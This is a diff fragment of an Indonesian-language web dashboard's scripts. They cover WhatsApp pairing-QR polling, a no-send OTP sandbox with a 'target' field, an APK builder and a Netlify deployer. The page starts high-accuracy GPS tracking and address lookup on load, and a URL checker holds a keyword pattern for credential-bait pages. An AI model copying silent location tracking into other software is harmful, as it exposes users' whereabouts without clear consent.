+    if(mode==='comic'){ video.style.display='none'; app.style.backgroundImage="url('spiderman2.jpg')"; app.style.backgroundSize='cover'; app.style.backgroundPosition='center'; }
+    else {
+      app.style.backgroundImage='none'; video.style.display='block';
+      if(source.getAttribute('src')!==file){source.src=file; video.load();}
+      video.play().catch(()=>{});
+    }
+  };
+  window.initLiveTelemetry=function(){
+    const update=()=>{
+      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      const type=c?.effectiveType || (navigator.onLine?'online':'offline');
+      const down=Number(c?.downlink); const rtt=Number(c?.rtt);
+      const ns=$('networkSpeed'), nt=$('networkType'), nr=$('networkRtt'), sig=$('signalLevel');
+      if(ns) ns.textContent=Number.isFinite(down)&&down>0 ? down.toFixed(1)+' Mbps' : (navigator.onLine?'Online':'Offline');
+      if(nt) nt.textContent='Jaringan '+String(type).toUpperCase();
+      if(nr) nr.textContent='RTT '+(Number.isFinite(rtt)&&rtt>0?rtt:'--')+' ms';
+      if(sig) sig.textContent=type==='4g'?'4G':type==='3g'?'3G':type==='2g'?'2G':type==='5g'?'5G':(navigator.onLine?'ONLINE':'OFF');
+    };
+    update();
+    ['online','offline'].forEach(e=>window.addEventListener(e,update));
+    const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(c) c.addEventListener?.('change',update);
+    setInterval(update,5000);
+  };
+  window.refreshPairQr=async function(){
+    const img=$('pairQrImage'), state=$('pairQrState'); if(!img||!state)return;
+    const base=String(window.NAELGHUB_API_BASE||'').replace(/\/$/,'');
+    if(!base){state.textContent='Backend URL belum diatur.';return;}
+    try{
+      const r=await fetch(base+'/api/qr',{cache:'no-store'}); const d=await r.json();
+      if(d.qrDataUrl){img.src=d.qrDataUrl;img.style.display='block';state.textContent='QR aktif — scan dari WhatsApp Perangkat Tertaut.';}
+      else{img.style.display='none';state.textContent='QR belum tersedia. Pastikan akun belum terhubung atau backend aktif.';}
+    }catch(e){img.style.display='none';state.textContent='QR backend belum terhubung.';}
+  };
+  window.runBackendHealthCheck=async function(){
+    const base=String(window.NAELGHUB_API_BASE||localStorage.getItem('naelghub_backend_url')||'').replace(/\/$/,'');
+    const status=$('monitorStatus'),lat=$('monitorLatency');
+    if(!base){if(status)status.textContent='URL belum diatur';return;}
+    const t=performance.now();
+    try{const r=await fetch(base+'/api/status',{cache:'no-store'});const ms=Math.round(performance.now()-t);
+      if(lat)lat.textContent=ms+' ms'; if(status)status.textContent=r.ok?'🟢 ONLINE':'🟠 HTTP '+r.status;
+    }catch(e){if(status)status.textContent='🔴 OFFLINE';if(lat)lat.textContent='-- ms';}
+  };
+  window.generateOtpSandbox=function(){
+    const target=$('otpTarget')?.value.trim()||'demo';
+    const code=String(Math.floor(100000+Math.random()*900000));
+    const log=$('otpLog'); if(log)log.textContent=`[SANDBOX] Target: ${target}\n[SANDBOX] OTP TEST: ${code}\n[SANDBOX] Tidak ada SMS dikirim.`;
+    if(typeof showToast==='function')showToast('OTP sandbox dibuat');
+  };
+  // Real-time GPS + reverse geocoding + weather from the same coordinates.
+  window.startRealtimeLocation=function(){
+    if(!navigator.geolocation)return;
+    const apply=async(pos)=>{
+      const {latitude,longitude,accuracy}=pos.coords;
+      const loc=$('ipLocation'),det=$('ipDetail'),addr=$('addressRealtime');
+      if(loc)loc.textContent=`${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+      if(det)det.textContent=`Akurasi ±${Math.round(accuracy||0)} m · GPS real-time` ;
+      try{localStorage.setItem('nael_gps',JSON.stringify({latitude,longitude,accuracy,timestamp:Date.now()}));}catch{}
+      try{
+        const a=await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,{headers:{'Accept':'application/json'}});
+        const d=await a.json(); const text=d.display_name||'Alamat tidak tersedia'; if(addr)addr.textContent='Alamat real-time: '+text;
+      }catch{if(addr)addr.textContent='Alamat real-time: tidak dapat dimuat';}
+      try{
+        const w=await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current=temperature_2m,weather_code,relative_humidity_2m,wind_speed_10m&timezone=auto`);
+        const d=await w.json(), c=d.current||{};
+        const temp=Number.isFinite(c.temperature_2m)?Math.round(c.temperature_2m):'--';
+        const hum=Number.isFinite(c.relative_humidity_2m)?c.relative_humidity_2m:'--';
+        const wind=Number.isFinite(c.wind_speed_10m)?Math.round(c.wind_speed_10m):'--';
+        const map={0:'fa-sun',1:'fa-cloud-sun',2:'fa-cloud-sun',3:'fa-cloud',45:'fa-smog',48:'fa-smog',51:'fa-cloud-rain',53:'fa-cloud-rain',55:'fa-cloud-rain',61:'fa-cloud-showers-heavy',63:'fa-cloud-showers-heavy',65:'fa-cloud-showers-heavy',71:'fa-snowflake',73:'fa-snowflake',75:'fa-snowflake',80:'fa-cloud-showers-heavy',81:'fa-cloud-showers-heavy',82:'fa-cloud-showers-heavy',95:'fa-bolt'};
+        const wi=$('weatherIcon'),wv=$('weatherValue'),ws=$('weatherSub'); if(wv)wv.textContent=temp+'°C'; if(ws)ws.textContent=`💧${hum}% · 💨${wind} km/j`; if(wi)wi.className='fas '+(map[c.weather_code]||'fa-cloud-sun');
+      }catch{if($('weatherValue'))$('weatherValue').textContent='--°C';if($('weatherSub'))$('weatherSub').textContent='Cuaca gagal dimuat';}
+    };
+    navigator.geolocation.watchPosition(apply,err=>{const d=$('ipDetail');if(d)d.textContent=err.code===1?'Izin GPS ditolak':'GPS belum tersedia';},{enableHighAccuracy:true,maximumAge:5000,timeout:15000});
+  };
+  window.getPreciseGPS=function(){ startRealtimeLocation(); if(typeof showToast==='function')showToast('📍 GPS real-time aktif'); };
+  document.addEventListener('DOMContentLoaded',()=>{
+    loadUiPreferences(); startRealtimeLocation(); runBackendHealthCheck(); refreshPairQr();
+    setInterval(runBackendHealthCheck,15000); setInterval(refreshPairQr,15000);
+  });
+})();
+</script>
+<style>
+.dashboard-bg-video{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;object-position:center;z-index:-2;pointer-events:none;opacity:.34;background:#05070d;transform:translateZ(0);will-change:transform}
+#dashboard-bg-overlay{position:fixed;inset:0;z-index:-1;background:linear-gradient(180deg,rgba(2,4,10,.58),rgba(2,4,10,.82));pointer-events:none}
+#app{position:relative;isolation:isolate;min-height:100vh}
+#app.comic-theme:before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(circle,rgba(255,255,255,.11) 1px,transparent 1px);background-size:7px 7px;mix-blend-mode:screen;z-index:-1}
+@media(max-width:720px){.dash-info-row{grid-template-columns:1fr}.pair-access-grid{grid-template-columns:1fr!important}.header-right .status{display:none}.status-bar{gap:5px!important;font-size:10px!important}}
+</style>
+
+<script>
+let noxxaSource='url';
+try{const b=localStorage.getItem('noxxa_builder_url');if(b&&document.getElementById('noxxaBuilderUrl'))document.getElementById('noxxaBuilderUrl').value=b;}catch{}
+function setNoxxaSource(src){
+  noxxaSource=src;
+  document.getElementById('noxxaUrlTab')?.classList.toggle('active',src==='url');
+  document.getElementById('noxxaHtmlTab')?.classList.toggle('active',src==='html');
+  document.getElementById('noxxaUrlBox')?.classList.toggle('noxxa-hidden',src!=='url');
+  document.getElementById('noxxaHtmlBox')?.classList.toggle('noxxa-hidden',src!=='html');
+  const info=document.getElementById('noxxaSourceInfo'); if(info) info.value=src==='url'?'URL Web':'Folder HTML';
+  updateNoxxaPreview();
+}
+function noxxaCheckUrlSafety(){
+  const out=document.getElementById('noxxaSafetyResult');
+  const raw=(document.getElementById('noxxaUrl')?.value||'').trim();
+  if(!raw){if(out)out.textContent='⚠️ Masukkan URL terlebih dahulu.';return;}
+  try{
+    const u=new URL(raw);
+    const flags=[];
+    if(u.protocol!=='https:') flags.push('Tidak memakai HTTPS');
+    if(u.username||u.password) flags.push('URL memakai username/password sebelum host');
+    if(/^(\d{1,3}\.){3}\d{1,3}$/.test(u.hostname)) flags.push('Host berupa alamat IP');
+    if(u.hostname.includes('xn--')) flags.push('Host memakai punycode (periksa ejaan domain)');
+    if((u.hostname.match(/\./g)||[]).length>=3) flags.push('Subdomain cukup banyak');
+    if(u.port && !['80','443'].includes(u.port)) flags.push('Memakai port non-standar');
+    if(/login|verify|verification|password|account|secure|wallet|gift|free/i.test(u.hostname+u.pathname+u.search)) flags.push('Mengandung kata yang sering dipakai dalam halaman umpan kredensial');
+    if(out) out.innerHTML=flags.length?'⚠️ Perlu diperiksa: '+flags.map(x=>'<br>• '+x).join(''):'✅ Tidak ditemukan indikator sederhana yang diperiksa.';
+  }catch{if(out)out.textContent='❌ URL tidak valid. Gunakan http:// atau https://';}
+}
+
+(function(){
+ const b=document.getElementById('noxxaBuilderUrl');
+ if(b) b.value='';
+})();
+function updateNoxxaPreview(){
+  const e=document.getElementById('noxxaPreviewUrl'),t=document.getElementById('noxxaPreviewText'),frame=document.getElementById('noxxaPreviewFrame'),fallback=document.getElementById('noxxaPreviewFallback');if(!e||!t)return;
+  if(noxxaSource==='url'){
+    const u=document.getElementById('noxxaUrl')?.value.trim();e.textContent=u||'Masukkan URL...';t.textContent=u?'URL Web preview':'Belum ada URL';
+    if(frame){frame.style.display=u?'block':'none';if(u){try{const parsed=new URL(u);if(/^https?:$/.test(parsed.protocol)){frame.src=parsed.toString();frame.onload=()=>{if(fallback)fallback.style.display='none'};frame.onerror=()=>{if(fallback)fallback.style.display='block'};}}catch{frame.removeAttribute('src');}}}
+    if(fallback&& !u)fallback.style.display='block';
+  } else {e.textContent='LOCAL HTML';t.textContent='Folder HTML preview';if(frame){frame.style.display='none';frame.removeAttribute('src');}if(fallback)fallback.style.display='block';}
+}
+function noxxaGoStep(step){if(step===2&&!validateNoxxa(true))return;document.getElementById('noxxaStep1')?.classList.toggle('noxxa-hidden',step!==1);document.getElementById('noxxaStep2')?.classList.toggle('noxxa-hidden',step!==2);const b=document.getElementById('noxxaStepBadge');if(b)b.textContent=step+'/2';}
+function previewNoxxaIcon(input){const f=input?.files?.[0],box=document.getElementById('noxxaIconPreview');if(!f||!box)return;const u=URL.createObjectURL(f);box.innerHTML='<img src="'+u.replace(/"/g,'&quot;')+'" alt="icon">';}
+function noxxaStatus(t){const e=document.getElementById('noxxaStatus');if(e)e.textContent=t;}
+function getNoxxaBuilderUrl(){
+ const raw=(document.getElementById('noxxaBuilderUrl')?.value.trim()||'').trim();
+ try{
+   const u=new URL(raw);
+   if(!/^https?:$/.test(u.protocol)) throw 0;
+   return u.toString().replace(/\/$/,'');
+ }catch{
+   return '';
+ }
+}
+function validateNoxxa(showStatus=true){
+ const name=document.getElementById('noxxaName')?.value.trim(),ver=document.getElementById('noxxaVersion')?.value.trim(),key=document.getElementById('noxxaKey')?.value.trim();
+ if(!name||!ver||!key){if(showStatus)noxxaStatus('❌ Nama, versi, dan key wajib diisi.');return false;}
+ if(!/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(key.toLowerCase())){if(showStatus)noxxaStatus('❌ Key/Package tidak valid. Contoh: com.naelghub.noxxa');return false;}
+ if(noxxaSource==='url'){try{const u=new URL(document.getElementById('noxxaUrl').value.trim());if(!/^https?:$/.test(u.protocol))throw 0;}catch{if(showStatus)noxxaStatus('❌ URL harus valid dan menggunakan http/https.');return false;}}
+ else{const files=[...(document.getElementById('noxxaFolder')?.files||[])];if(!files.length){if(showStatus)noxxaStatus('❌ Pilih folder HTML terlebih dahulu.');return false;}if(!files.some(f=>f.name.toLowerCase().endsWith('/index.html')||f.name.toLowerCase()==='index.html')){if(showStatus)noxxaStatus('❌ Folder harus memiliki index.html.');return false;}}
+ if(showStatus)noxxaStatus('✅ Validasi berhasil.');return true;
+}
+function setNoxxaBuildProgress(p,label,stage){
+ const wrap=document.getElementById('noxxaBuildProgress'),bar=document.getElementById('noxxaProgressBar'),pct=document.getElementById('noxxaProgressPct'),lab=document.getElementById('noxxaProgressLabel'),st=document.getElementById('noxxaBuildStage');
+ if(wrap)wrap.style.display='block'; if(bar)bar.style.width=Math.max(0,Math.min(100,p))+'%'; if(pct)pct.textContent=Math.round(p)+'%'; if(lab)lab.textContent=label||'Memproses...'; if(st)st.textContent=stage||'';
+}
+function toggleNoxxaSection(btn){const box=btn?.closest('.nx-accordion');if(!box)return;const open=box.classList.toggle('open');const state=box.querySelector('.nx-acc-state');if(state)state.textContent=open?'Tutup':'Buka';}
+function initNoxxaAccordions(){document.querySelectorAll('.nx-accordion').forEach((box,i)=>{if(i===0)box.classList.add('open');else box.classList.remove('open');const state=box.querySelector('.nx-acc-state');if(state)state.textContent=box.classList.contains('open')?'Tutup':'Buka';});}
+async function generateNoxxaProject(){
+ if(!validateNoxxa(true))return;
+ const name=document.getElementById('noxxaName').value.trim(),ver=document.getElementById('noxxaVersion').value.trim(),key=document.getElementById('noxxaKey').value.trim();
+ if(noxxaSource!=='url'){noxxaStatus('❌ Cloud Builder saat ini menerima URL Web. Pilih URL Web terlebih dahulu.');return;}
+ const url=document.getElementById('noxxaUrl').value.trim();
+ noxxaStatus('⏳ Mengirim build ke Cloud Builder...');setNoxxaBuildProgress(8,'Memvalidasi','Memeriksa URL dan konfigurasi APK...');
+ try{
+   const check=await fetch('/.netlify/functions/noxxa-inspect-url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
+   const ci=await check.json();if(!check.ok||!ci.ok)throw Error(ci.error||'URL tidak dapat diverifikasi');
+   setNoxxaBuildProgress(18,'URL terverifikasi','Mengirim project ke GitHub Actions...');
+   const r=await fetch('/.netlify/functions/noxxa-build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:ci.finalUrl||url,name,versionName:ver,packageName:key})});
+   const d=await r.json();if(!r.ok)throw Error(d.error||'Cloud Builder tidak merespons');
+   noxxaStatus('☁️ Build masuk antrean GitHub Actions.');setNoxxaBuildProgress(24,'Build antrean','Menunggu runner Android...');
+   pollNoxxaCloudBuild(d.buildId,0);
+ }catch(e){setNoxxaBuildProgress(0,'Build gagal',e.message);noxxaStatus('❌ '+e.message);}
+}
+async function pollNoxxaCloudBuild(id,attempt){
+ try{
+   const r=await fetch('/.netlify/functions/noxxa-build-status?id='+encodeURIComponent(id),{cache:'no-store'});const j=await r.json();
+   const log=document.getElementById('noxxaBuildLog');if(log)log.textContent=j.message||'';
+   if(j.status==='queued'){setNoxxaBuildProgress(28,'Menunggu runner','GitHub Actions sedang menyiapkan build...');}
+   else if(j.status==='in_progress'){const p=Math.min(88,32+(attempt%18)*3);setNoxxaBuildProgress(p,'Membuat APK','Android SDK / Gradle sedang mengompilasi APK...');}
+   else if(j.status==='publishing'){setNoxxaBuildProgress(94,'Menyiapkan APK','Build selesai, file APK sedang dipublikasikan...');}
+   else if(j.status==='done'&&j.apk){setNoxxaBuildProgress(100,'APK selesai','APK berhasil dibuat dan siap di-download.');noxxaStatus('✅ APK benar-benar selesai dibuat!');const a=document.getElementById('noxxaDownload');if(a){a.href=j.apk;a.style.display='inline-flex';a.textContent='⬇️ DOWNLOAD APK';}refreshNoxxaApks();return;}
+   else if(j.status==='error'||j.ok===false){setNoxxaBuildProgress(0,'Build gagal',j.error||'Build Android gagal.');noxxaStatus('❌ Build gagal: '+(j.error||'Unknown error'));return;}
+   setTimeout(()=>pollNoxxaCloudBuild(id,attempt+1),2500);
+ }catch(e){setNoxxaBuildProgress(20,'Menghubungkan...','Menunggu status Cloud Builder...');setTimeout(()=>pollNoxxaCloudBuild(id,attempt+1),3500);}
+}
+async function refreshNoxxaApks(){
+ const list=document.getElementById('noxxaApkList');if(!list)return;list.innerHTML='<div class="noxxa-help">☁️ Membaca APK dari Cloud Builder...</div>';
+ // Cloud releases are surfaced by the build completion link; local APK shelf is kept as a compatibility area.
+}
+function escapeHtml(v){return String(v??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+async function shareNoxxaApk(encoded,nameEncoded){const url=decodeURIComponent(encoded),name=decodeURIComponent(nameEncoded);try{if(navigator.share){await navigator.share({title:name,text:name+' — NOXXA APK',url});}else{await navigator.clipboard.writeText(url);if(typeof showToast==='function')showToast('🔗 Link APK disalin');else alert('Link APK disalin');}}catch(e){}}
+
+
+/* ============ NOXXA BUILD URL/WEBSITE ============ */
+let noxxaWebSource='url';
+function setNoxxaWebSource(src){
+  noxxaWebSource=src;
+  document.getElementById('noxxaWebUrlTab')?.classList.toggle('active',src==='url');
+  document.getElementById('noxxaWebFolderTab')?.classList.toggle('active',src==='folder');
+  document.getElementById('noxxaWebUrlBox')?.classList.toggle('noxxa-hidden',src!=='url');
+  document.getElementById('noxxaWebFolderBox')?.classList.toggle('noxxa-hidden',src!=='folder');
+}
+function setNoxxaWebProgress(p,label,stage){
+  const w=document.getElementById('noxxaWebProgress'),b=document.getElementById('noxxaWebProgressBar'),pct=document.getElementById('noxxaWebProgressPct'),lab=document.getElementById('noxxaWebProgressLabel'),st=document.getElementById('noxxaWebProgressStage');
+  if(w)w.style.display='block'; if(b)b.style.width=Math.max(0,Math.min(100,p))+'%'; if(pct)pct.textContent=Math.round(p)+'%'; if(lab)lab.textContent=label||'Memproses...'; if(st)st.textContent=stage||'';
+}
+function noxxaWebStatus(t){const e=document.getElementById('noxxaWebStatus');if(e)e.textContent=t;}
+function slugifyNoxxaSite(v){return String(v||'noxxa-site').toLowerCase().trim().replace(/[^a-z0-9-]+/g,'-').replace(/^-+|-+$/g,'').slice(0,48)||'noxxa-site';}
+async function zipNoxxaFolder(files){
+  if(!window.JSZip)throw Error('Library ZIP belum dimuat. Refresh halaman lalu coba lagi.');
+  const zip=new JSZip(); let count=0,total=0;
+  for(const f of files){total+=f.size;if(total>4500000)throw Error('Folder terlalu besar. Maksimum sekitar 4.5 MB untuk cloud publish.');}
+  for(const f of files){
+    let path=f.webkitRelativePath||f.name; path=path.replace(/^.*?\//,'');
+    if(!path||path.includes('..'))continue;
+    zip.file(path,await f.arrayBuffer()); count++;
+  }
+  if(!files.some(f=>/^(?:.*\/)?index\.html?$/i.test(f.webkitRelativePath||f.name)))throw Error('Folder wajib memiliki index.html.');
+  return {base64:await zip.generateAsync({type:'base64',compression:'DEFLATE',compressionOptions:{level:6}}),count,total};
+}
+async function deployNoxxaWebsite(){
+  const name=slugifyNoxxaSite(document.getElementById('noxxaWebName')?.value),title=(document.getElementById('noxxaWebTitle')?.value||'NOXXA Website').trim(),description=(document.getElementById('noxxaWebDescription')?.value||'Website dibuat dengan NOXXA').trim();
+  const result=document.getElementById('noxxaWebResult'); if(result)result.style.display='none';
+  setNoxxaWebProgress(5,'Memeriksa konfigurasi','Menyiapkan website...'); noxxaWebStatus('⏳ Menyiapkan publish...');
+  try{
+    const body={name,title,description,sourceType:noxxaWebSource};
+    if(noxxaWebSource==='url'){
+      const url=(document.getElementById('noxxaWebUrl')?.value||'').trim();
+      if(!/^https?:\/\/[^\s]+$/i.test(url))throw Error('URL sumber harus http:// atau https://.');
+      body.url=url;
+    }else{
+      const files=[...(document.getElementById('noxxaWebFolder')?.files||[])]; if(!files.length)throw Error('Pilih folder website terlebih dahulu.');
+      setNoxxaWebProgress(15,'Mengemas folder','Membuat ZIP website di perangkat...');
+      const z=await zipNoxxaFolder(files); body.zipBase64=z.base64; body.fileCount=z.count; body.bytes=z.total;
+    }
+    setNoxxaWebProgress(38,'Mengirim ke Netlify','Membuat project dan deployment...');
+    const r=await fetch('/.netlify/functions/noxxa-site-deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    const d=await r.json().catch(()=>({})); if(!r.ok)throw Error(d.error||'Netlify tidak menerima deployment.');
+    setNoxxaWebProgress(82,'Deployment diproses','Netlify sedang mempublikasikan website...');
+    const live=d.url||d.ssl_url||d.deploy_url;
+    if(live){
+      setNoxxaWebProgress(100,'Website online','Deployment berhasil.');
+      noxxaWebStatus('✅ Website berhasil dipublish.');
+      if(result){result.style.display='block';result.innerHTML='<b>🌐 Website Online</b><div style="margin-top:8px"><a href="'+escapeHtml(live)+'" target="_blank" rel="noopener" style="color:#00e676;word-break:break-all">'+escapeHtml(live)+'</a></div><button class="noxxa-btn" style="margin-top:10px;width:100%" onclick="navigator.clipboard?.writeText('+JSON.stringify(live)+');showToast?.(\'🔗 URL disalin\')">SALIN URL</button>';}
+    }else{setNoxxaWebProgress(100,'Deployment diterima','Menunggu URL dari Netlify...');noxxaWebStatus('✅ Deployment diterima.');}
+  }catch(e){setNoxxaWebProgress(0,'Publish gagal',e.message||'Unknown error');noxxaWebStatus('❌ '+(e.message||'Gagal publish website'));}
+}
+
+initNoxxaAccordions();
+
+setTimeout(refreshNoxxaApks,500);
+</script>
+</body>
+</html>
